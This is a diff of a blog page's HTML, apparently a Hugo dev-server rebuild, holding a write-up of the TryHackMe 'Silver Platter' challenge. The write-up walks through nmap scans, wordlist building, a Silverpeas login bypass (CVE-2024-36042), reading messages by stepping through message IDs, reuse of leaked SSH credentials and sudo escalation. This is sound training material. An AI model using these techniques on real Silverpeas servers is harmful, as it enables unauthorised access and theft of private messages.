@@ -1,62 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
   
     <title> :: MrFCode Blog</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="CTF challenge solved. Silver Platter - TryHackMe 24-03-2025
-Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
-# Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96 Warning: 10.10.126.96 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.126.96 Host is up (0.21s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12." />
+Starting with nmap Scanning the target to identify open ports $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
+# Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96 Warning: 10.10.126.96 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.126.96 Host is up (0.21s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12.61 seconds We have port 22/tcp,80/tcp and 8080/tcp open. Scanning more in-depth on the target $sudo nmap -sVC -Pn -T5 -p 80,22,8080 -oN nmap/deep 10.10.126.96
+" />
 <meta name="keywords" content="" />
 
   <meta name="robots" content="noodp" />
 
-<link rel="canonical" href="/posts/ctf/thm/silverplatter/" />
+<link rel="canonical" href="//localhost:1313/posts/ctf/thm/silverplatter/" />
 
 
 
 
 
   
-  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
 
   
-  <link rel="stylesheet" href="/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
 
   
-  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
 
   
-  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
 
   
-  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
 
   
-  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
 
   
-  <link rel="stylesheet" href="/css/main.min.15870410d15d02abd22fb5ef00996f65a00d04b3a7435e9f83831c7c2298de88.css">
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css">
 
   
-  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">
 
   
-  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
 
   
-  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">
 
   
-  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">
 
   
-  <link rel="stylesheet" href="/css/terminal.min.1e13462d8ceb20ed877bf415ffdd55caddb9852b1423b3419ac82080527cc8aa.css">
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.a0f34322ce6c615465a3a289723955f810b25fff2337dbefbe9003084ad43106.css">
 
   
-  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
 
 
 
@@ -64,8 +65,8 @@ Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -
 
 
 
-<link rel="shortcut icon" href="/favicon.png">
-<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
 
 
 <meta name="twitter:card" content="summary" />
@@ -81,12 +82,13 @@ Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -
 <meta property="og:type" content="article" />
 <meta property="og:title" content="">
 <meta property="og:description" content="CTF challenge solved. Silver Platter - TryHackMe 24-03-2025
-Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
-# Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96 Warning: 10.10.126.96 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.126.96 Host is up (0.21s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12." />
-<meta property="og:url" content="/posts/ctf/thm/silverplatter/" />
+Starting with nmap Scanning the target to identify open ports $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
+# Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96 Warning: 10.10.126.96 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.126.96 Host is up (0.21s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12.61 seconds We have port 22/tcp,80/tcp and 8080/tcp open. Scanning more in-depth on the target $sudo nmap -sVC -Pn -T5 -p 80,22,8080 -oN nmap/deep 10.10.126.96
+" />
+<meta property="og:url" content="//localhost:1313/posts/ctf/thm/silverplatter/" />
 <meta property="og:site_name" content="MrFCode Blog" />
 
-  <meta property="og:image" content="/og-image.png">
+  <meta property="og:image" content="//localhost:1313/og-image.png">
 
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="627">
@@ -167,7 +169,7 @@ Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -
     
 <article class="post">
   <h1 class="post-title">
-    <a href="/posts/ctf/thm/silverplatter/"></a>
+    <a href="//localhost:1313/posts/ctf/thm/silverplatter/"></a>
   </h1>
   <div class="post-meta"></div>
 
@@ -178,7 +180,7 @@ Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -
   
 
   <div class="post-content"><div>
-        <h1 id="ctfhttpsenwikipediaorgwikicapture_the_flag_cybersecurity-challenge-solved"><a href="https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)">CTF</a> challenge solved.<a href="#ctfhttpsenwikipediaorgwikicapture_the_flag_cybersecurity-challenge-solved" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+        <h1 id="ctf-challenge-solved"><a href="https://en.wikipedia.org/wiki/Capture_the_flag_%28cybersecurity%29">CTF</a> challenge solved.<a href="#ctf-challenge-solved" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <h1 id="silver-platter---tryhackme">Silver Platter - TryHackMe<a href="#silver-platter---tryhackme" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p>24-03-2025</p>
 <h2 id="starting-with-nmap">Starting with nmap<a href="#starting-with-nmap" class="hanchor" ariaLabel="Anchor">#</a> </h2>
@@ -197,7 +199,6 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12.61 seconds
-
 </code></pre><ul>
 <li>We have port 22/tcp,80/tcp and 8080/tcp open.</li>
 </ul>
@@ -239,43 +240,40 @@ PORT     STATE SERVICE    VERSION
 |_    &lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404 - Not Found&lt;/body&gt;&lt;/html&gt;
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port8080-TCP:V=7.94SVN%I=7%D=3/24%Time=67E10316%P=x86_64-pc-linux-gnu%r
-SF:(GetRequest,C9,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20clos
+SF:(GetRequest,C9,&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20clos
 SF:e\r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mo
 SF:n,\x2024\x20Mar\x202025\x2007:00:38\x20GMT\r\n\r\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Er
-SF:ror&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404\x20-\x20Not\x20Found&lt;/body&gt;&lt;/html&gt;&quot;)%r(HTTP
-SF:Options,C9,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
+SF:ror&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404\x20-\x20Not\x20Found&lt;/body&gt;&lt;/html&gt;&#34;)%r(HTTP
+SF:Options,C9,&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
 SF:nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\x
 SF:2024\x20Mar\x202025\x2007:00:38\x20GMT\r\n\r\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;
-SF:/title&gt;&lt;/head&gt;&lt;body&gt;404\x20-\x20Not\x20Found&lt;/body&gt;&lt;/html&gt;&quot;)%r(RTSPRequ
-SF:est,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
-SF:onnection:\x20close\r\n\r\n&quot;)%r(FourOhFourRequest,C9,&quot;HTTP/1\.1\x20404\
+SF:/title&gt;&lt;/head&gt;&lt;body&gt;404\x20-\x20Not\x20Found&lt;/body&gt;&lt;/html&gt;&#34;)%r(RTSPRequ
+SF:est,42,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
+SF:onnection:\x20close\r\n\r\n&#34;)%r(FourOhFourRequest,C9,&#34;HTTP/1\.1\x20404\
 SF:x20Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nCon
 SF:tent-Type:\x20text/html\r\nDate:\x20Mon,\x2024\x20Mar\x202025\x2007:00:
 SF:39\x20GMT\r\n\r\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404\x20-\
-SF:x20Not\x20Found&lt;/body&gt;&lt;/html&gt;&quot;)%r(Socks5,42,&quot;HTTP/1\.1\x20400\x20Bad\x2
-SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&quot;)%r(Ge
-SF:nericLines,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
-SF:00\r\nConnection:\x20close\r\n\r\n&quot;)%r(Help,42,&quot;HTTP/1\.1\x20400\x20Bad
-SF:\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&quot;)%r
-SF:(SSLSessionReq,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length
-SF::\x200\r\nConnection:\x20close\r\n\r\n&quot;)%r(TerminalServerCookie,42,&quot;HTT
+SF:x20Not\x20Found&lt;/body&gt;&lt;/html&gt;&#34;)%r(Socks5,42,&#34;HTTP/1\.1\x20400\x20Bad\x2
+SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&#34;)%r(Ge
+SF:nericLines,42,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
+SF:00\r\nConnection:\x20close\r\n\r\n&#34;)%r(Help,42,&#34;HTTP/1\.1\x20400\x20Bad
+SF:\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&#34;)%r
+SF:(SSLSessionReq,42,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x200\r\nConnection:\x20close\r\n\r\n&#34;)%r(TerminalServerCookie,42,&#34;HTT
 SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\
-SF:x20close\r\n\r\n&quot;)%r(TLSSessionReq,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Reque
-SF:st\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&quot;)%r(Kerberos
-SF:,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
-SF:ection:\x20close\r\n\r\n&quot;)%r(SMBProgNeg,42,&quot;HTTP/1\.1\x20400\x20Bad\x20
-SF:Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&quot;)%r(LPD
-SF:String,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r
-SF:\nConnection:\x20close\r\n\r\n&quot;)%r(LDAPSearchReq,42,&quot;HTTP/1\.1\x20400\x
+SF:x20close\r\n\r\n&#34;)%r(TLSSessionReq,42,&#34;HTTP/1\.1\x20400\x20Bad\x20Reque
+SF:st\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&#34;)%r(Kerberos
+SF:,42,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
+SF:ection:\x20close\r\n\r\n&#34;)%r(SMBProgNeg,42,&#34;HTTP/1\.1\x20400\x20Bad\x20
+SF:Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&#34;)%r(LPD
+SF:String,42,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r
+SF:\nConnection:\x20close\r\n\r\n&#34;)%r(LDAPSearchReq,42,&#34;HTTP/1\.1\x20400\x
 SF:20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\
-SF:n&quot;);
+SF:n&#34;);
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Mon Mar 24 07:02:09 2025 -- 1 IP address (1 host up) scanned in 97.64 seconds
-
-
-
 </code></pre><h2 id="exploring-the-website-on-port-80tcp-http">Exploring the website on port 80/tcp (http)<a href="#exploring-the-website-on-port-80tcp-http" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>pages on the site (sitemap):</li>
@@ -306,7 +304,6 @@ HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)],
 IP[10.10.126.96], 
 JQuery, Script, Title[Hack Smarter Security], 
 nginx[1.18.0]
-
 </code></pre><p>After a while, brute-forcing directories and files in the web server. I tried to scrape the words on the site using cewl to create a custom word list and saved it into a file:</p>
 <p><code>$cewl http://10.10.126.96 &gt; wordlist</code></p>
 <ul>
@@ -321,7 +318,7 @@ count = 0 # initialized an count variable
 while count &lt;= limit: # Creating a loop with an condition
     
     # Loading the wordlist file to read the lines
-    with open(&quot;wordlist.txt&quot;, &quot;r&quot;) as f:
+    with open(&#34;wordlist.txt&#34;, &#34;r&#34;) as f:
         
         # Storring line by line in this variable on every loop
         data = f.readlines()[count]
@@ -331,8 +328,6 @@ while count &lt;= limit: # Creating a loop with an condition
         
         # Keep updating the value till it reach the maximum line number
         count += 1
-
-
 </code></pre><p>Then run the code and save it into another file.</p>
 <p><code>$python3 converter.py &gt; wordlist.txt</code></p>
 <h2 id="now-checking-the-website-pages-on-port-8080tcp-with-the-wordlist">Now checking the website pages on port 8080/tcp with the wordlist:<a href="#now-checking-the-website-pages-on-port-8080tcp-with-the-wordlist" class="hanchor" ariaLabel="Anchor">#</a> </h2>
@@ -354,7 +349,6 @@ Target: http://10.10.126.96:8080/
 [09:44:41] 302 -    0B  - /silverpeas  -&gt;  http://10.10.126.96:8080/silverpeas/
 
 Task Completed
-
 </code></pre><h2 id="after-opening-the-page-i-discovered-that-it-was-a-login-page">After opening the page, I discovered that it was a login page.<a href="#after-opening-the-page-i-discovered-that-it-was-a-login-page" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>It was Silverpeas login page, and after Googling for the default credential for that site, I found that there was a CVE for bypassing the login, <a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d">CVE-2024-36042</a>. Also by default, the admin name in Silverpeas is SilverAdmin, found from a Google <a href="https://sdl.ist.osaka-u.ac.jp/~h-azuma/satd-docker/scrape/silverpeas.html">search</a>. So by connecting these dots, we can login to the admin account using the CVE login bypass.</p>
 <h3 id="found-some-more-cves-for-the-silverpeas-634--635">Found some more CVEs for the Silverpeas 6.3.4 &lt; 6.3.5.<a href="#found-some-more-cves-for-the-silverpeas-634--635" class="hanchor" ariaLabel="Anchor">#</a> </h3>
@@ -377,8 +371,7 @@ Description
 
 The notification/messaging feature of Silverpeas Core 6.3.1 does not enforce access control on the ID parameter. This allows an attacker to read all messages sent between other users; including those sent only to administrators.
 Usage/Exploitation
-To exploit this vulnerability, an attacker can use a script or Burp Suite Intruder to view all messages by attacking the ID parameter in this URL: http://localhost:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID] - the messages begin at &quot;1&quot; and increase in intervals of 1.
-
+To exploit this vulnerability, an attacker can use a script or Burp Suite Intruder to view all messages by attacking the ID parameter in this URL: http://localhost:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID] - the messages begin at &#34;1&#34; and increase in intervals of 1.
 </code></pre><h2 id="after-reading-the-messages-one-by-one-i-found-interesting-information-in-the-6th-message">After reading the messages one by one, I found interesting information in the 6th message:<a href="#after-reading-the-messages-one-by-one-i-found-interesting-information-in-the-6th-message" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>http://10.10.151.252:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6</li>
@@ -389,7 +382,6 @@ Dude how do you always forget the SSH password? Use a password manager and quit 
 Username: tim
 
 Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
-
 </code></pre><p>With this we can SSH into the server.</p>
 <h4 id="using-the-ssh-credential">using the SSH credential:<a href="#using-the-ssh-credential" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <ul>
@@ -421,8 +413,6 @@ Matching Defaults entries for tyler on silver-platter:
 
 User tyler may run the following commands on silver-platter:
     (ALL : ALL) ALL
-
-
 </code></pre><h2 id="got-root-access-by-entering-sudo-su">Got root access by entering <code>sudo su</code><a href="#got-root-access-by-entering-sudo-su" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Found root flag at root directory.</li>
@@ -439,7 +429,7 @@ User tyler may run the following commands on silver-platter:
   </div>
   <div class="pagination__buttons">
     
-      <a href="/posts/blogsetup/" class="button inline prev">
+      <a href="//localhost:1313/posts/blogsetup/" class="button inline prev">
         &lt; [<span class="button__text"></span>]
       </a>
     
@@ -447,7 +437,7 @@ User tyler may run the following commands on silver-platter:
       ::
     
     
-      <a href="/posts/docker101/" class="button inline next">
+      <a href="//localhost:1313/posts/docker101/" class="button inline next">
          [<span class="button__text"></span>] &gt;
       </a>
     
